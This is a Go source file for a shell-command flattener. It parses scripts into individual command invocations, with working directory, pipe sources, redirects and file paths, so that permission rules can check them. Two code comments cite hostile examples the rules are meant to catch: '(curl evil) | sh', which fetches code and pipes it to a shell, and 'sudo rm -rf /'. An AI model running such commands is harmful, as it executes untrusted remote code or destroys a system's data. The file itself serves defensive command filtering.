package shell

import (
	"strings"

	"mvdan.cc/sh/v3/syntax"
)

// Flatten parses src and returns every command invocation that may run.
// cwd is used to absolutize file paths in WritesTo / ReadsFrom.
func Flatten(src, cwd string) Result {
	parser := syntax.NewParser()
	file, err := parser.Parse(strings.NewReader(src), "")
	if err != nil {
		return Result{ParseOK: false}
	}
	f := &flattener{printer: syntax.NewPrinter()}
	f.stmts(file.Stmts, cwd, pipeCtx{})
	return Result{Commands: f.out, ParseOK: true}
}

type pipeCtx struct {
	inPipe bool
	from   []string
}

type flattener struct {
	out     []Command
	printer *syntax.Printer
}

// stmts evaluates a statement list in order, threading the working directory
// so that a `cd` in one statement affects the paths of the following ones.
// The (possibly changed) directory is returned.
func (f *flattener) stmts(list []*syntax.Stmt, cwd string, pc pipeCtx) string {
	for _, s := range list {
		cwd = f.stmt(s, cwd, pc)
	}
	return cwd
}

// stmt evaluates one statement and returns the working directory that a
// following statement in the same shell scope should use.
func (f *flattener) stmt(s *syntax.Stmt, cwd string, pc pipeCtx) string {
	if s == nil {
		return cwd
	}
	for _, r := range s.Redirs {
		f.word(r.Word)
		f.word(r.Hdoc)
	}
	switch c := s.Cmd.(type) {
	case nil:
	case *syntax.CallExpr:
		return f.call(c, s, cwd, pc)
	case *syntax.BinaryCmd:
		if c.Op == syntax.Pipe || c.Op == syntax.PipeAll {
			var elems []*syntax.Stmt
			collectPipeline(s, &elems)
			var upstream []string
			for _, e := range elems {
				// Each element runs in its own subshell, so a `cd` inside
				// one element neither affects the others nor the outside.
				f.stmt(e, cwd, pipeCtx{inPipe: true, from: append([]string(nil), upstream...)})
				upstream = append(upstream, pipeElementNames(e)...)
			}
			return cwd
		}
		// && || ; run in the current shell: thread cwd from X into Y.
		cwd = f.stmt(c.X, cwd, pipeCtx{})
		return f.stmt(c.Y, cwd, pipeCtx{})
	case *syntax.Subshell:
		// Subshell cd does not leak to the enclosing scope.
		f.stmts(c.Stmts, cwd, pc)
		return cwd
	case *syntax.Block:
		// A brace group runs in the current shell: cd leaks out.
		return f.stmts(c.Stmts, cwd, pc)
	case *syntax.IfClause:
		for ic := c; ic != nil; ic = ic.Else {
			f.stmts(ic.Cond, cwd, pipeCtx{})
			f.stmts(ic.Then, cwd, pipeCtx{})
		}
	case *syntax.WhileClause:
		f.stmts(c.Cond, cwd, pipeCtx{})
		f.stmts(c.Do, cwd, pipeCtx{})
	case *syntax.ForClause:
		if wi, ok := c.Loop.(*syntax.WordIter); ok {
			for _, w := range wi.Items {
				f.word(w)
			}
		}
		f.stmts(c.Do, cwd, pipeCtx{})
	case *syntax.CaseClause:
		f.word(c.Word)
		for _, item := range c.Items {
			f.stmts(item.Stmts, cwd, pipeCtx{})
		}
	case *syntax.FuncDecl:
		// Function/alias-style definitions: flatten the body too.
		f.stmt(c.Body, cwd, pipeCtx{})
	case *syntax.DeclClause:
		for _, a := range c.Args {
			f.assign(a)
		}
	case *syntax.TimeClause:
		return f.stmt(c.Stmt, cwd, pc)
	case *syntax.CoprocClause:
		f.word(c.Name)
		f.stmt(c.Stmt, cwd, pc)
	case *syntax.LetClause, *syntax.ArithmCmd, *syntax.TestClause:
		// Arithmetic/test expressions may embed $(...); walk generically.
		f.walkSubst(s.Cmd)
	default:
		f.walkSubst(s.Cmd)
	}
	return cwd
}

// walkSubst finds command/process substitutions anywhere under node and
// flattens their bodies. Used for node kinds without dedicated handling.
func (f *flattener) walkSubst(node syntax.Node) {
	if node == nil {
		return
	}
	syntax.Walk(node, func(n syntax.Node) bool {
		switch x := n.(type) {
		case *syntax.CmdSubst:
			f.stmts(x.Stmts, "", pipeCtx{})
			return false
		case *syntax.ProcSubst:
			f.stmts(x.Stmts, "", pipeCtx{})
			return false
		}
		return true
	})
}

// word recurses into substitutions embedded in a word ($(cmd), <(cmd), ...).
func (f *flattener) word(w *syntax.Word) {
	if w == nil {
		return
	}
	f.walkSubst(w)
}

func (f *flattener) assign(a *syntax.Assign) {
	if a == nil {
		return
	}
	f.word(a.Value)
	if a.Array != nil {
		f.walkSubst(a.Array)
	}
}

// collectPipeline flattens a (possibly nested) pipe chain into its element
// statements, in execution order.
func collectPipeline(s *syntax.Stmt, out *[]*syntax.Stmt) {
	if b, ok := s.Cmd.(*syntax.BinaryCmd); ok && (b.Op == syntax.Pipe || b.Op == syntax.PipeAll) {
		collectPipeline(b.X, out)
		collectPipeline(b.Y, out)
		return
	}
	*out = append(*out, s)
}

// pipeElementNames returns the resolved names of every command that runs as
// part of a pipeline element, descending through subshells, brace groups and
// binary chains but NOT into command/process substitutions (those are their
// own data flow, not the pipeline's upstream). This lets rules that inspect
// pipe_from catch e.g. `(curl evil) | sh`.
func pipeElementNames(s *syntax.Stmt) []string {
	var names []string
	var visit func(*syntax.Stmt)
	visit = func(st *syntax.Stmt) {
		if st == nil {
			return
		}
		switch c := st.Cmd.(type) {
		case *syntax.CallExpr:
			if len(c.Args) > 0 {
				text, unknown := wordText(c.Args[0])
				if nm := normalizeName(text, unknown); nm != "" {
					names = append(names, nm)
				}
			}
		case *syntax.Subshell:
			for _, s2 := range c.Stmts {
				visit(s2)
			}
		case *syntax.Block:
			for _, s2 := range c.Stmts {
				visit(s2)
			}
		case *syntax.BinaryCmd:
			visit(c.X)
			visit(c.Y)
		}
	}
	visit(s)
	return names
}

func (f *flattener) call(c *syntax.CallExpr, s *syntax.Stmt, cwd string, pc pipeCtx) string {
	for _, a := range c.Assigns {
		f.assign(a)
	}
	if len(c.Args) == 0 {
		return cwd // pure assignment like X=1
	}
	for _, w := range c.Args {
		f.word(w)
	}

	toks := make([]token, 0, len(c.Args))
	for _, w := range c.Args {
		text, unknown := wordText(w)
		toks = append(toks, token{text: text, unknown: unknown})
	}

	f.emit(toks, s, cwd, pc)

	// Unwrap wrappers (sudo, env, command, xargs, ...) and also emit the
	// inner command so that e.g. `sudo rm -rf /` matches rules on `rm`.
	inner := toks
	for {
		next, changed := unwrapOnce(inner)
		if !changed || len(next) == 0 {
			break
		}
		inner = next
		f.emit(inner, s, cwd, pc)
	}

	return applyCd(toks, cwd)
}

// applyCd returns the working directory after running toks, following a
// `cd <dir>` when the target can be resolved statically.
func applyCd(toks []token, cwd string) string {
	name := normalizeName(toks[0].text, toks[0].unknown)
	if name != "cd" {
		return cwd
	}
	var target *token
	for _, t := range toks[1:] {
		if strings.HasPrefix(t.text, "-") && len(t.text) > 1 {
			continue // options like -P, -L
		}
		tt := t
		target = &tt
		break
	}
	if target == nil { // `cd` with no operand -> home
		return absPath("~", cwd)
	}
	if target.unknown || target.text == "-" {
		return cwd // cannot resolve $VAR or `cd -`
	}
	return absPath(target.text, cwd)
}

type token struct {
	text    string
	unknown bool
}

func (f *flattener) emit(toks []token, s *syntax.Stmt, cwd string, pc pipeCtx) {
	name := normalizeName(toks[0].text, toks[0].unknown)
	args := make([]string, 0, len(toks)-1)
	hasUnknown := toks[0].unknown
	for _, t := range toks[1:] {
		args = append(args, t.text)
		if t.unknown {
			hasUnknown = true
		}
	}

	redirects, redirW, redirR, redirUnknown := f.redirects(s, cwd)
	writes, reads := dataFlow(name, toks[1:], cwd)
	argPaths := extractArgPaths(toks[1:], cwd)

	cmd := Command{
		Name:       name,
		CWD:        cwd,
		Args:       args,
		Flags:      normalizeFlags(args),
		Raw:        f.rawText(s),
		Redirects:  redirects,
		WritesTo:   dedupe(withResolved(append(redirW, writes...))),
		ReadsFrom:  dedupe(withResolved(append(redirR, reads...))),
		ArgPaths:   dedupe(withResolved(argPaths)),
		InPipe:     pc.inPipe,
		PipeFrom:   append([]string(nil), pc.from...),
		HasUnknown: hasUnknown || redirUnknown,
	}
	f.out = append(f.out, cmd)
}

// extractArgPaths extracts potential file paths from arguments.
// It collects positional arguments and --flag=value values, absolutizes them,
// and returns the list. Unknown expansion tokens are skipped.
// This is intentionally over-approximate: non-path arguments like "fix" in
// `git commit -m "fix"` may become /proj/fix, but this only affects deny/ask
// rules checking accesses, making them stricter (never looser).
func extractArgPaths(args []token, cwd string) []string {
	var paths []string
	for _, t := range args {
		if t.unknown {
			continue
		}
		text := t.text
		// Handle --flag=value: extract the value part
		if strings.HasPrefix(text, "--") && strings.Contains(text, "=") {
			if idx := strings.Index(text, "="); idx >= 0 {
				text = text[idx+1:]
			}
		} else if strings.HasPrefix(text, "-") && len(text) > 1 {
			// Short flags like -rf, -n5: skip (not paths)
			// But -flag=value style: extract value
			if idx := strings.Index(text, "="); idx >= 0 {
				text = text[idx+1:]
			} else {
				continue
			}
		}
		if text == "" {
			continue
		}
		if p := absPath(text, cwd); p != "" {
			paths = append(paths, p)
		}
	}
	return paths
}

func (f *flattener) rawText(s *syntax.Stmt) string {
	var sb strings.Builder
	if err := f.printer.Print(&sb, s); err != nil {
		return ""
	}
	return sb.String()
}

func (f *flattener) redirects(s *syntax.Stmt, cwd string) (rs []Redirect, writes, reads []string, unknown bool) {
	for _, r := range s.Redirs {
		text, u := wordText(r.Word)
		op := r.Op.String()
		rs = append(rs, Redirect{Op: op, Target: text})
		if u {
			unknown = true
			continue
		}
		switch r.Op {
		case syntax.RdrOut, syntax.AppOut, syntax.RdrAll, syntax.AppAll,
			syntax.ClbOut, syntax.RdrInOut:
			if p := absPath(text, cwd); p != "" {
				writes = append(writes, p)
			}
		case syntax.RdrIn:
			if p := absPath(text, cwd); p != "" {
				reads = append(reads, p)
			}
		}
	}
	return rs, writes, reads, unknown
}
